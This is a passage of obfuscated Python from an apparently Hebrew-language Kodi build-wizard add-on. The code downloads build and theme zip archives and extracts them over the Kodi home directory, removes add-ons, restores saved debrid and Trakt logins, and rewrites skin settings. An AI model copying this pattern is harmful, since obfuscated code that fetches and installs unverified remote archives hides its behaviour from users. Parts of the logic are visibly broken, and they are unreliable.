			O0OO00OOOO0O0OO00 =open (O000O0000O00O000O ,'w')#line:3891
			O0OO00OOOO0O0OO00 .write (OO00O0O0OO00OO0OO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O00O0O0O00OO000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3892
			O0OO00OOOO0O0OO00 .close ()#line:3893
		except :#line:3894
				pass #line:3895
		wiz .kodi17Fix ()#line:3896
		O000O0000O00O000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3897
		try :#line:3898
			O0OO00OOOO0O0OO00 =open (O000O0000O00O000O ,'r')#line:3899
			OO00O0O0OO00OO0OO =O0OO00OOOO0O0OO00 .read ()#line:3900
			O0OO00OOOO0O0OO00 .close ()#line:3901
			OO00O00O0000OO00O ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3902
			O0O00O0O0O00OO000 =re .compile (OO00O00O0000OO00O ).findall (OO00O0O0OO00OO0OO )[0 ]#line:3903
			O0OO00OOOO0O0OO00 =open (O000O0000O00O000O ,'w')#line:3904
			O0OO00OOOO0O0OO00 .write (OO00O0O0OO00OO0OO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O00O0O0O00OO000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3905
			O0OO00OOOO0O0OO00 .close ()#line:3906
		except :#line:3907
				pass #line:3908
		swapSkins ('skin.Premium.mod')#line:3909
def buildWizard (O0OO0O00O000O0O0O ,O0O0OOO00O0000O0O ,theme =None ,over =False ):#line:3912
	O0O00OOOOOO0O0O00 =xbmcgui .DialogBusy ()#line:3913
	O0O00OOOOOO0O0O00 .create ()#line:3914
	if over ==False :#line:3915
		O0OOOOO00O0000O00 =wiz .checkBuild (O0OO0O00O000O0O0O ,'url')#line:3916
		if USERNAME =='':#line:3917
			ADDON .openSettings ()#line:3918
			sys .exit ()#line:3919
		if PASSWORD =='':#line:3920
			ADDON .openSettings ()#line:3921
			sys .exit ()#line:3922
		if BUILDNAME =='':#line:3924
			OO0O000O00O00OOO0 =u_list (SPEEDFILE )#line:3925
			(OO0O000O00O00OOO0 )#line:3926
		if O0OOOOO00O0000O00 ==False :#line:3927
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3932
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3933
			return #line:3934
		OO0O0O0000OO00OO0 =wiz .workingURL (O0OOOOO00O0000O00 )#line:3935
		if OO0O0O0000OO00OO0 ==False :#line:3936
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO0O0O0000OO00OO0 ))#line:3937
			return #line:3938
	if O0O0OOO00O0000O0O =='gui':#line:3939
		if O0OO0O00O000O0O0O ==BUILDNAME :#line:3940
			if over ==True :OOO0O0O0O0O00O0OO =1 #line:3941
			else :OOO0O0O0O0O00O0OO =1 #line:3942
		else :#line:3943
			OOO0O0O0O0O00O0OO =1 #line:3944
		if OOO0O0O0O0O00O0OO :#line:3945
			remove_addons ()#line:3946
			remove_addons2 ()#line:3947
			debridit .debridIt ('update','all')#line:3948
			traktit .traktIt ('update','all')#line:3949
			OO0000OO00000O000 =wiz .checkBuild (O0OO0O00O000O0O0O ,'gui')#line:3950
			OOOOOOO0000OO000O =O0OO0O00O000O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3951
			if not wiz .workingURL (OO0000OO00000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3952
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3953
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O ),'','אנא המתן')#line:3954
			OO00000000OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOO0000OO000O )#line:3955
			try :os .remove (OO00000000OOOOO0O )#line:3956
			except :pass #line:3957
			logging .warning (OO0000OO00000O000 )#line:3958
			if 'google'in OO0000OO00000O000 :#line:3959
			   OO0OOO00OO0000OO0 =googledrive_download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP ,wiz .checkBuild (O0OO0O00O000O0O0O ,'filesize'))#line:3960
			else :#line:3963
			  downloader .download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP )#line:3964
			xbmc .sleep (100 )#line:3965
			O000O00O0O0O00O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O )#line:3966
			DP .update (0 ,O000O00O0O0O00O00 ,'','אנא המתן')#line:3967
			extract .all (OO00000000OOOOO0O ,HOME ,DP ,title =O000O00O0O0O00O00 )#line:3968
			DP .close ()#line:3969
			wiz .defaultSkin ()#line:3970
			wiz .lookandFeelData ('save')#line:3971
			wiz .kodi17Fix ()#line:3972
			if KODIV >=18 :#line:3973
				skindialogsettind18 ()#line:3974
			debridit .debridIt ('restore','all')#line:3975
			traktit .traktIt ('restore','all')#line:3976
			if INSTALLMETHOD ==1 :OO0OO0O0O0O00000O =1 #line:3978
			elif INSTALLMETHOD ==2 :OO0OO0O0O0O00000O =0 #line:3979
			else :DP .close ()#line:3980
			O0O00OOOO0000OO00 =(NOTIFICATION2 )#line:3981
			OO0OOO0OOOOO000OO =urllib2 .urlopen (O0O00OOOO0000OO00 )#line:3982
			OO0O0OO0OOO0OO000 =OO0OOO0OOOOO000OO .readlines ()#line:3983
			O0O000OOOOO0O00OO =0 #line:3984
			for OO0O00OOO000OOO0O in OO0O0OO0OOO0OO000 :#line:3987
				if OO0O00OOO000OOO0O .split (' ==')[0 ]=="noreset"or OO0O00OOO000OOO0O .split ()[0 ]=="noreset":#line:3988
					xbmc .executebuiltin ("ReloadSkin()")#line:3990
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3991
					update_Votes ()#line:3992
					indicatorfastupdate ()#line:3993
				if OO0O00OOO000OOO0O .split (' ==')[0 ]=="reset"or OO0O00OOO000OOO0O .split ()[0 ]=="reset":#line:3994
					update_Votes ()#line:3996
					indicatorfastupdate ()#line:3997
					resetkodi ()#line:3998
		else :#line:4007
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4008
	if O0O0OOO00O0000O0O =='gui2':#line:4009
		if O0OO0O00O000O0O0O ==BUILDNAME :#line:4010
			if over ==True :OOO0O0O0O0O00O0OO =1 #line:4011
			else :OOO0O0O0O0O00O0OO =1 #line:4012
		else :#line:4013
			OOO0O0O0O0O00O0OO =1 #line:4014
		if OOO0O0O0O0O00O0OO :#line:4015
			remove_addons ()#line:4016
			remove_addons2 ()#line:4017
			OO0000OO00000O000 =wiz .checkBuild (O0OO0O00O000O0O0O ,'gui')#line:4018
			OOOOOOO0000OO000O =O0OO0O00O000O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4019
			if not wiz .workingURL (OO0000OO00000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4020
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4021
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O ),'','אנא המתן')#line:4022
			OO00000000OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOO0000OO000O )#line:4023
			try :os .remove (OO00000000OOOOO0O )#line:4024
			except :pass #line:4025
			logging .warning (OO0000OO00000O000 )#line:4026
			if 'google'in OO0000OO00000O000 :#line:4027
			   OO0OOO00OO0000OO0 =googledrive_download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP ,wiz .checkBuild (O0OO0O00O000O0O0O ,'filesize'))#line:4028
			else :#line:4031
			  downloader .download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP )#line:4032
			xbmc .sleep (100 )#line:4033
			O000O00O0O0O00O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O )#line:4034
			DP .update (0 ,O000O00O0O0O00O00 ,'','אנא המתן')#line:4035
			extract .all (OO00000000OOOOO0O ,HOME ,DP ,title =O000O00O0O0O00O00 )#line:4036
			DP .close ()#line:4037
			wiz .defaultSkin ()#line:4038
			wiz .lookandFeelData ('save')#line:4039
			if INSTALLMETHOD ==1 :OO0OO0O0O0O00000O =1 #line:4042
			elif INSTALLMETHOD ==2 :OO0OO0O0O0O00000O =0 #line:4043
			else :DP .close ()#line:4044
		else :#line:4046
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4047
	elif O0O0OOO00O0000O0O =='fresh':#line:4048
		freshStart (O0OO0O00O000O0O0O )#line:4049
	elif O0O0OOO00O0000O0O =='normal':#line:4050
		if url =='normal':#line:4051
			if KEEPTRAKT =='true':#line:4052
				traktit .autoUpdate ('all')#line:4053
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4054
			if KEEPREAL =='true':#line:4055
				debridit .autoUpdate ('all')#line:4056
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4057
			if KEEPLOGIN =='true':#line:4058
				loginit .autoUpdate ('all')#line:4059
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4060
		O0O0000OO00OO00OO =int (KODIV );O000000OO0OOO0OO0 =int (float (wiz .checkBuild (O0OO0O00O000O0O0O ,'kodi')))#line:4061
		if not O0O0000OO00OO00OO ==O000000OO0OOO0OO0 :#line:4062
			if O0O0000OO00OO00OO ==16 and O000000OO0OOO0OO0 <=15 :OO000O000OO0OO000 =False #line:4063
			else :OO000O000OO0OO000 =True #line:4064
		else :OO000O000OO0OO000 =False #line:4065
		if OO000O000OO0OO000 ==True :#line:4066
			O0OO00OO00O0OO00O =1 #line:4067
		else :#line:4068
			if not over ==False :O0OO00OO00O0OO00O =1 #line:4069
			else :O0OO00OO00O0OO00O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4070
		if O0OO00OO00O0OO00O :#line:4071
			wiz .clearS ('build')#line:4072
			OO0000OO00000O000 =wiz .checkBuild (O0OO0O00O000O0O0O ,'url')#line:4073
			OOOOOOO0000OO000O =O0OO0O00O000O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4074
			if not wiz .workingURL (OO0000OO00000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4075
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4076
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O ,wiz .checkBuild (O0OO0O00O000O0O0O ,'version')),'','אנא המתן')#line:4077
			OO00000000OOOOO0O =os .path .join (PACKAGES ,'%s.zip'%OOOOOOO0000OO000O )#line:4078
			try :os .remove (OO00000000OOOOO0O )#line:4079
			except :pass #line:4080
			logging .warning (OO0000OO00000O000 )#line:4081
			if 'google'in OO0000OO00000O000 :#line:4082
			   OO0OOO00OO0000OO0 =googledrive_download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP ,wiz .checkBuild (O0OO0O00O000O0O0O ,'filesize'))#line:4083
			else :#line:4086
			  downloader .download (OO0000OO00000O000 ,OO00000000OOOOO0O ,DP )#line:4087
			xbmc .sleep (1000 )#line:4088
			O000O00O0O0O00O00 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O ,wiz .checkBuild (O0OO0O00O000O0O0O ,'version'))#line:4089
			DP .update (0 ,O000O00O0O0O00O00 ,'','אנא המתן...')#line:4090
			OO00O0OOO0O000O00 ,OO00O00O0OOOOOOO0 ,OO0O0OOO00O0O00O0 =extract .all (OO00000000OOOOO0O ,HOME ,DP ,title =O000O00O0O0O00O00 )#line:4091
			if int (float (OO00O0OOO0O000O00 ))>0 :#line:4092
				try :#line:4093
					wiz .fixmetas ()#line:4094
				except :pass #line:4095
				wiz .lookandFeelData ('save')#line:4096
				wiz .defaultSkin ()#line:4097
				wiz .setS ('buildname',O0OO0O00O000O0O0O )#line:4099
				wiz .setS ('buildversion',wiz .checkBuild (O0OO0O00O000O0O0O ,'version'))#line:4100
				wiz .setS ('buildtheme','')#line:4101
				wiz .setS ('latestversion',wiz .checkBuild (O0OO0O00O000O0O0O ,'version'))#line:4102
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4103
				wiz .setS ('installed','true')#line:4104
				wiz .setS ('extract',str (OO00O0OOO0O000O00 ))#line:4105
				wiz .setS ('errors',str (OO00O00O0OOOOOOO0 ))#line:4106
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00O0OOO0O000O00 ,OO00O00O0OOOOOOO0 ))#line:4107
				fastupdatefirstbuild (NOTEID )#line:4108
				wiz .kodi17Fix ()#line:4109
				skin_homeselect ()#line:4110
				skin_lower ()#line:4111
				rdbuildinstall ()#line:4112
				try :gaiaserenaddon ()#line:4113
				except :pass #line:4114
				adults18 ()#line:4115
				skinfix18 ()#line:4116
				try :os .remove (OO00000000OOOOO0O )#line:4118
				except :pass #line:4119
				OOO00OO00O0O0OOO0 =(ADDON .getSetting ("auto_rd"))#line:4120
				if OOO00OO00O0O0OOO0 =='true':#line:4121
					try :#line:4122
						setautorealdebrid ()#line:4123
					except :pass #line:4124
				try :#line:4125
					autotrakt ()#line:4126
				except :pass #line:4127
				O0O0OOOOOO00OOO0O =(ADDON .getSetting ("imdb_on"))#line:4128
				if O0O0OOOOOO00OOO0O =='true':#line:4129
					imdb_synck ()#line:4130
				iptvset ()#line:4131
				DP .close ()#line:4139
				O0OO0O0OOO000OOO0 =wiz .themeCount (O0OO0O00O000O0O0O )#line:4140
				builde_Votes ()#line:4141
				indicator ()#line:4142
				if not O0OO0O0OOO000OOO0 ==False :#line:4143
					buildWizard (O0OO0O00O000O0O0O ,'theme')#line:4144
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4145
				if INSTALLMETHOD ==1 :OO0OO0O0O0O00000O =1 #line:4146
				elif INSTALLMETHOD ==2 :OO0OO0O0O0O00000O =0 #line:4147
				else :resetkodi ()#line:4148
				if OO0OO0O0O0O00000O ==1 :wiz .reloadFix ()#line:4150
				else :wiz .killxbmc (True )#line:4151
			else :#line:4152
				if isinstance (OO00O00O0OOOOOOO0 ,unicode ):#line:4153
					OO0O0OOO00O0O00O0 =OO0O0OOO00O0O00O0 .encode ('utf-8')#line:4154
				OOO0O00OOO000O0OO =open (OO00000000OOOOO0O ,'r')#line:4155
				OOO0O00OO0OOOO0O0 =OOO0O00OOO000O0OO .read ()#line:4156
				O00O00OO0OO0OOO0O =''#line:4157
				for OOO00OOOO0O000000 in OO0OOO00OO0000OO0 :#line:4158
				  O00O00OO0OO0OOO0O ='key: '+O00O00OO0OO0OOO0O +'\n'+OOO00OOOO0O000000 #line:4159
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0OOO00O0O00O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00O00OO0OO0OOO0O )#line:4160
		else :#line:4161
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4162
	elif O0O0OOO00O0000O0O =='theme':#line:4163
		if theme ==None :#line:4164
			O0OO0O0OOO000OOO0 =wiz .checkBuild (O0OO0O00O000O0O0O ,'theme')#line:4165
			OOOOOOO0OOOO0O00O =[]#line:4166
			if not O0OO0O0OOO000OOO0 =='http://'and wiz .workingURL (O0OO0O0OOO000OOO0 )==True :#line:4167
				OOOOOOO0OOOO0O00O =wiz .themeCount (O0OO0O00O000O0O0O ,False )#line:4168
				if len (OOOOOOO0OOOO0O00O )>0 :#line:4169
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0OO0O00O000O0O0O ,COLOR1 ,len (OOOOOOO0OOOO0O00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4170
						wiz .log ("Theme List: %s "%str (OOOOOOO0OOOO0O00O ))#line:4171
						OOO0OO0O0O00O0OOO =DIALOG .select (ADDONTITLE ,OOOOOOO0OOOO0O00O )#line:4172
						wiz .log ("Theme install selected: %s"%OOO0OO0O0O00O0OOO )#line:4173
						if not OOO0OO0O0O00O0OOO ==-1 :theme =OOOOOOO0OOOO0O00O [OOO0OO0O0O00O0OOO ];OO0OO0OOO0O00O0O0 =True #line:4174
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4175
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4176
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4177
		else :OO0OO0OOO0O00O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0OO0O00O000O0O0O ,wiz .checkBuild (O0OO0O00O000O0O0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4178
		if OO0OO0OOO0O00O0O0 :#line:4179
			O000O00OOOO0OOOOO =wiz .checkTheme (O0OO0O00O000O0O0O ,theme ,'url')#line:4180
			OOOOOOO0000OO000O =O0OO0O00O000O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4181
			if not wiz .workingURL (O000O00OOOO0OOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4182
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4183
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4184
			OO00000000OOOOO0O =os .path .join (PACKAGES ,'%s.zip'%OOOOOOO0000OO000O )#line:4185
			try :os .remove (OO00000000OOOOO0O )#line:4186
			except :pass #line:4187
			downloader .download (O000O00OOOO0OOOOO ,OO00000000OOOOO0O ,DP )#line:4188
			xbmc .sleep (1000 )#line:4189
			DP .update (0 ,"","Installing %s "%O0OO0O00O000O0O0O )#line:4190
			OO00OO000O000OO0O =False #line:4191
			if url not in ["fresh","normal"]:#line:4192
				OO00OO000O000OO0O =testTheme (OO00000000OOOOO0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4193
				O0O0O0OO0O0OO0O00 =testGui (OO00000000OOOOO0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4194
				if OO00OO000O000OO0O ==True :#line:4195
					wiz .lookandFeelData ('save')#line:4196
					O00O0O00OOOO0O0O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4197
					O0OO00O00O0OO00O0 =xbmc .getSkinDir ()#line:4198
					skinSwitch .swapSkins (O00O0O00OOOO0O0O0 )#line:4200
					OO0O0OO0OOO0OO000 =0 #line:4201
					xbmc .sleep (1000 )#line:4202
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0OOO0OO000 <150 :#line:4203
						OO0O0OO0OOO0OO000 +=1 #line:4204
						xbmc .sleep (1000 )#line:4205
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4206
						wiz .ebi ('SendClick(11)')#line:4207
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4208
					xbmc .sleep (1000 )#line:4209
			O000O00O0O0O00O00 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4210
			DP .update (0 ,O000O00O0O0O00O00 ,'','אנא המתן')#line:4211
			OO00O0OOO0O000O00 ,OO00O00O0OOOOOOO0 ,OO0O0OOO00O0O00O0 =extract .all (OO00000000OOOOO0O ,HOME ,DP ,title =O000O00O0O0O00O00 )#line:4212
			wiz .setS ('buildtheme',theme )#line:4213
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00O0OOO0O000O00 ,OO00O00O0OOOOOOO0 ))#line:4214
			DP .close ()#line:4215
			if url not in ["fresh","normal"]:#line:4216
				wiz .forceUpdate ()#line:4217
				if KODIV >=17 :wiz .kodi17Fix ()#line:4218
				if O0O0O0OO0O0OO0O00 ==True :#line:4219
					wiz .lookandFeelData ('save')#line:4220
					wiz .defaultSkin ()#line:4221
					O0OO00O00O0OO00O0 =wiz .getS ('defaultskin')#line:4222
					skinSwitch .swapSkins (O0OO00O00O0OO00O0 )#line:4223
					OO0O0OO0OOO0OO000 =0 #line:4224
					xbmc .sleep (1000 )#line:4225
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0OOO0OO000 <150 :#line:4226
						OO0O0OO0OOO0OO000 +=1 #line:4227
						xbmc .sleep (1000 )#line:4228
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4230
						wiz .ebi ('SendClick(11)')#line:4231
					wiz .lookandFeelData ('restore')#line:4232
				elif OO00OO000O000OO0O ==True :#line:4233
					skinSwitch .swapSkins (O0OO00O00O0OO00O0 )#line:4234
					OO0O0OO0OOO0OO000 =0 #line:4235
					xbmc .sleep (1000 )#line:4236
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0OOO0OO000 <150 :#line:4237
						OO0O0OO0OOO0OO000 +=1 #line:4238
						xbmc .sleep (1000 )#line:4239
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4241
						wiz .ebi ('SendClick(11)')#line:4242
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4243
					wiz .lookandFeelData ('restore')#line:4244
				else :#line:4245
					wiz .ebi ("ReloadSkin()")#line:4246
					xbmc .sleep (1000 )#line:4247
					wiz .ebi ("Container.Refresh")#line:4248
		else :#line:4249
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4250
def skin_homeselect ():#line:4254
	try :#line:4256
		O00OO00000O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
		OOO0OO00O0O0OOOO0 =open (O00OO00000O000000 ,'r')#line:4259
		OOOO0OOOOO00000OO =OOO0OO00O0O0OOOO0 .read ()#line:4260
		OOO0OO00O0O0OOOO0 .close ()#line:4261
		O00OOOOOO00OOO0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4262
		OO0OO0OOO0O000O0O =re .compile (O00OOOOOO00OOO0O0 ).findall (OOOO0OOOOO00000OO )[0 ]#line:4263
		OOO0OO00O0O0OOOO0 =open (O00OO00000O000000 ,'w')#line:4264
		OOO0OO00O0O0OOOO0 .write (OOOO0OOOOO00000OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0OO0OOO0O000O0O ,'<setting id="HomeS" type="string"></setting>'))#line:4265
		OOO0OO00O0O0OOOO0 .close ()#line:4266
	except :#line:4267
		pass #line:4268
def skin_lower ():#line:4271
	O0OOO0000000O00OO =(ADDON .getSetting ("lower"))#line:4272
	if O0OOO0000000O00OO =='true':#line:4273
		try :#line:4276
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4277
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4279
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4280
			O000OOO000OOOO0O0 .close ()#line:4281
			OOOO0OOOO00O00OOO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4282
			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4283
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4284
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4285
			O000OOO000OOOO0O0 .close ()#line:4286
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4288
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4290
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4291
			O000OOO000OOOO0O0 .close ()#line:4292
			OOOO0OOOO00O00OOO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4293
			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4294
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4295
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4296
			O000OOO000OOOO0O0 .close ()#line:4297
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4299
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4301
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4302
			O000OOO000OOOO0O0 .close ()#line:4303
			OOOO0OOOO00O00OOO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4304
			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4305
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4306
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4307
			O000OOO000OOOO0O0 .close ()#line:4308
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4312
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4314
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4315
			O000OOO000OOOO0O0 .close ()#line:4316
			OOOO0OOOO00O00OOO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4317
